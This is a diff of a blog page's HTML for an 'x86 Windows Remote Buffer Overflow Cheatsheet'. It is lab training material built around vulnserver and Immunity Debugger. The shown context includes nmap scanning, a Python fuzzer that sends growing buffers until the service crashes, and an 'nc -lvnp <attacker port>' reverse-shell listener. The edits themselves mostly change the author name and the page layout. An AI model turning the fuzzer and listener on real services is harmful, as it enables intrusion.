@@ -9,12 +9,12 @@
   <link rel="stylesheet" href="https://stackpath.bootstrapcdn.com/bootstrap/4.4.1/css/bootstrap.min.css" integrity="sha384-Vkoo8x4CGsO3+Hhxv8T/Q5PaXtkKtu6ug5TOeNV6gBiFeWPGFN9MuhOf23Q9Ifjh" crossorigin="anonymous">
 
   
-    <title>x86 Windows Remote Buffer Overflow Cheatsheet :: Matthias</title>
+    <title>x86 Windows Remote Buffer Overflow Cheatsheet :: fpkmatthi</title>
   
   <meta http-equiv="content-type" content="text/html; charset=utf-8">
 <meta name="viewport" content="width=device-width, initial-scale=1.0, maximum-scale=1">
 <meta name="description" content="Template code
-Prerequisites  Windows VM  Immunity Debugger PATH contains C:\python27 C:\python27\Pycommands\mona.py   Linux VM  Kali, Parrot, custom build   Both VMs need to contact each other A will to live  Windows VM  Launch Immunity Debugger as Administrator File &amp;gt; Open &amp;gt; vulnserver.exe Set it to run  Repeat after every crash  Linux VM Scan the victim IP
+Prerequisites  Windows VM  Immunity Debugger PATH contains C:\python27 C:\python27\Pycommands\mona.py   Linux VM  Kali, Parrot, custom build   Both VMs need to contact each other A will to live  Windows VM  Launch Immunity Debugger as Administrator File &amp;gt; Open &amp;gt; vulnserver.exe Set it to run &amp;lt;F9&amp;gt; Repeat after every crash  Linux VM Scan the victim IP
 nmap -p- &amp;lt;ip&amp;gt; Connect to the port where the app listens on"/>
 <meta name="keywords" content="Windows, x86, Buffer Overflow, Cheatsheet"/>
 <meta name="robots" content="noodp"/>
@@ -40,9 +40,9 @@ nmap -p- &amp;lt;ip&amp;gt; Connect to the port where the app listens on"/>
 
 
 <meta name="twitter:card" content="summary" />
-<meta name="twitter:title" content="x86 Windows Remote Buffer Overflow Cheatsheet :: Matthias — " />
+<meta name="twitter:title" content="x86 Windows Remote Buffer Overflow Cheatsheet :: fpkmatthi — " />
 <meta name="twitter:description" content="Template code
-Prerequisites  Windows VM  Immunity Debugger PATH contains C:\python27 C:\python27\Pycommands\mona.py   Linux VM  Kali, Parrot, custom build   Both VMs need to contact each other A will to live  Windows VM  Launch Immunity Debugger as Administrator File &amp;gt; Open &amp;gt; vulnserver.exe Set it to run  Repeat after every crash  Linux VM Scan the victim IP
+Prerequisites  Windows VM  Immunity Debugger PATH contains C:\python27 C:\python27\Pycommands\mona.py   Linux VM  Kali, Parrot, custom build   Both VMs need to contact each other A will to live  Windows VM  Launch Immunity Debugger as Administrator File &amp;gt; Open &amp;gt; vulnserver.exe Set it to run &amp;lt;F9&amp;gt; Repeat after every crash  Linux VM Scan the victim IP
 nmap -p- &amp;lt;ip&amp;gt; Connect to the port where the app listens on" />
 <meta name="twitter:site" content="https://me.fpkmatthi.xyz" />
 <meta name="twitter:creator" content="Matthias Van De Velde" />
@@ -51,9 +51,9 @@ nmap -p- &amp;lt;ip&amp;gt; Connect to the port where the app listens on" />
 
 <meta property="og:locale" content="en" />
 <meta property="og:type" content="article" />
-<meta property="og:title" content="x86 Windows Remote Buffer Overflow Cheatsheet :: Matthias — ">
+<meta property="og:title" content="x86 Windows Remote Buffer Overflow Cheatsheet :: fpkmatthi — ">
 <meta property="og:description" content="Template code
-Prerequisites  Windows VM  Immunity Debugger PATH contains C:\python27 C:\python27\Pycommands\mona.py   Linux VM  Kali, Parrot, custom build   Both VMs need to contact each other A will to live  Windows VM  Launch Immunity Debugger as Administrator File &amp;gt; Open &amp;gt; vulnserver.exe Set it to run  Repeat after every crash  Linux VM Scan the victim IP
+Prerequisites  Windows VM  Immunity Debugger PATH contains C:\python27 C:\python27\Pycommands\mona.py   Linux VM  Kali, Parrot, custom build   Both VMs need to contact each other A will to live  Windows VM  Launch Immunity Debugger as Administrator File &amp;gt; Open &amp;gt; vulnserver.exe Set it to run &amp;lt;F9&amp;gt; Repeat after every crash  Linux VM Scan the victim IP
 nmap -p- &amp;lt;ip&amp;gt; Connect to the port where the app listens on" />
 <meta property="og:url" content="https://me.fpkmatthi.xyz/posts/x86winbofnetw/" />
 <meta property="og:site_name" content="x86 Windows Remote Buffer Overflow Cheatsheet" />
@@ -84,7 +84,7 @@ nmap -p- &amp;lt;ip&amp;gt; Connect to the port where the app listens on" />
     <div class="header__logo">
       <a href="/">
   <div class="logo">
-    Matthias Van De Velde
+    fpkmatthi
   </div>
 </a>
 
@@ -186,7 +186,7 @@ nmap -p- &amp;lt;ip&amp;gt; Connect to the port where the app listens on" />
 <ol>
 <li>Launch Immunity Debugger as Administrator</li>
 <li>File &gt; Open &gt; <code>vulnserver.exe</code></li>
-<li>Set it to <strong>run <F9></strong></li>
+<li>Set it to <strong>run <code>&lt;F9&gt;</code></strong></li>
 <li>Repeat after every crash</li>
 </ol>
 <h2 id="linux-vm">Linux VM<a href="#linux-vm" class="hanchor" ariaLabel="Anchor">&#8983;</a> </h2>
@@ -198,8 +198,8 @@ nmap -p- &amp;lt;ip&amp;gt; Connect to the port where the app listens on" />
 <ol>
 <li>Look for commands that can take input like:
 <ul>
-<li>STATS <args></li>
-<li>TRUN <args></li>
+<li><code>STATS &lt;args&gt;</code></li>
+<li><code>TRUN &lt;args&gt;</code></li>
 <li>&hellip;</li>
 </ul>
 </li>
@@ -217,7 +217,8 @@ s_string_variable<span style="color:#f92672">(</span><span style="color:#e6db74"
 </ol>
 <h2 id="fuzzing">Fuzzing<a href="#fuzzing" class="hanchor" ariaLabel="Anchor">&#8983;</a> </h2>
 <ol>
-<li>On every crash, try higher increments in buffer size to see if you can overwrite EIP</li>
+<li>On every crash, try higher increments in buffer size to see if you
+can overwrite EIP</li>
 <li>Keep an eye on Immunity Debugger</li>
 </ol>
 <div class="highlight"><pre style="color:#f8f8f2;background-color:#272822;-moz-tab-size:4;-o-tab-size:4;tab-size:4"><code class="language-Python" data-lang="Python"><span style="color:#75715e">#!/usr/bin/env python3</span>
@@ -237,7 +238,7 @@ buffer<span style="color:#f92672">=</span><span style="color:#e6db74">b</span><s
         s<span style="color:#f92672">.</span>send(<span style="color:#e6db74">b</span><span style="color:#e6db74">&#39;</span><span style="color:#e6db74">&lt;cmd&gt; ./:/</span><span style="color:#e6db74">&#39;</span><span style="color:#f92672">+</span>buffer)
         s<span style="color:#f92672">.</span>recv(<span style="color:#ae81ff">1024</span>)            <span style="color:#75715e"># Important, otherwise it won&#39;t crash</span>
         s<span style="color:#f92672">.</span>close()
-        sleep(<span style="color:#ae81ff">1</span>)                <span style="color:#75715e"># Don&#39;t forget to sleep, otherwise crash when sending to fast</span>
+        sleep(<span style="color:#ae81ff">1</span>)                <span style="color:#75715e"># Sleep, otherwise crash when sending to fast</span>
         buffer<span style="color:#f92672">=</span>buffer<span style="color:#f92672">+</span><span style="color:#e6db74">b</span><span style="color:#e6db74">&#39;</span><span style="color:#e6db74">A</span><span style="color:#e6db74">&#39;</span><span style="color:#f92672">*</span>buffersize_incr
     <span style="color:#66d9ef">except</span>:
         <span style="color:#66d9ef">print</span>(<span style="color:#e6db74"></span><span style="color:#e6db74">&#39;</span><span style="color:#e6db74">Crashed at {} bytes</span><span style="color:#e6db74">&#39;</span><span style="color:#f92672">.</span>format(str(len(buffer))))
@@ -366,6 +367,13 @@ nc -lvnp &lt;attacker port&gt;
     </div>
     <div class="pagination__buttons">
       
+      <span class="button previous">
+        <a href="https://me.fpkmatthi.xyz/posts/arch-dp/">
+          <span class="button__icon">←</span>
+          <span class="button__text">Arch DisplayLink</span>
+        </a>
+      </span>
+      
       
       <span class="button next">
         <a href="https://me.fpkmatthi.xyz/posts/brainpan/">
@@ -389,7 +397,7 @@ nc -lvnp &lt;attacker port&gt;
   <div class="footer__inner">
     
       <div class="copyright copyright--user">
-        <span>© Matthias Van De Velde</span>
+        <span>© fpkmatthi</span>
     
         <span>:: Theme made by <a href="https://twitter.com/panr">panr</a></span>
       </div>
@@ -407,9 +415,6 @@ nc -lvnp &lt;attacker port&gt;
 <footer class="container-fluid text-center text-white mt-4 pt-4 pb-3">
     <a href="https://github.com/fpkmatthi" alt="link to github account">
         <i class="mr-3 fab fa-github fa-2x" aria-hidden="true"></i>
-    </a>
-    <a href="/contact/index.html" alt="link to contact page">
-        <i class="mr-3 fas fa-envelope fa-2x" aria-hidden="true"></i>
     </a>
     <a href="https://www.linkedin.com/in/matthias-vdv" alt="link to LinkedIn account">
         <i class="fab fa-linkedin-in fa-2x" aria-hidden="true"></i>
